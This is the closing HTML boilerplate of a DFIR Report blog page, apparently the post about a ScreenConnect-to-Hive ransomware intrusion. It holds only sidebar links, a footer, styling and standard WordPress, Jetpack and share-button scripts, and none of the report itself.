<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="bb4c8a2ffab6f225d2c1407e-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/09\/25\/from-screenconnect-to-hive-ransomware-in-61-hours\/":21520};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"21520\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "21520" ]);
/* ]]> */
</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="bb4c8a2ffab6f225d2c1407e-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="bb4c8a2ffab6f225d2c1407e-|49" defer></script></body>
</html>
